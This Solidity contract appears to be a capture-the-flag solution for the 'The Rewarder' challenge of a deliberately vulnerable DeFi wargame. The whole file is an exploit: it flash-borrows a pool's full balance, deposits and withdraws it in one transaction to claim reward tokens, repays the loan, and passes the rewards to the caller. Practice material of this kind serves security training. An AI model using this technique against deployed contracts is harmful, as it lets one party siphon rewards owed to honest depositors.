// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract RewardAttacker {
    FlashLoanerPool flashLoanPool;
    DamnValuableToken token;
    TheRewarderPool rewarderPool;
    RewardToken rewardToken;

    constructor(
        address _poolAddress,
        address _rewarderPoolAddress,
        address _tokenAddress,
        address _rewardTokenAddress
    ) {
        flashLoanPool = FlashLoanerPool(_poolAddress);
        rewarderPool = TheRewarderPool(_rewarderPoolAddress);
        token = DamnValuableToken(_tokenAddress);
        rewardToken = RewardToken(_rewardTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) public payable {
        token.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        token.transfer(address(flashLoanPool), amount);
    }

    function flashLoan() external {
        uint256 amountToLoan = token.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(amountToLoan);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
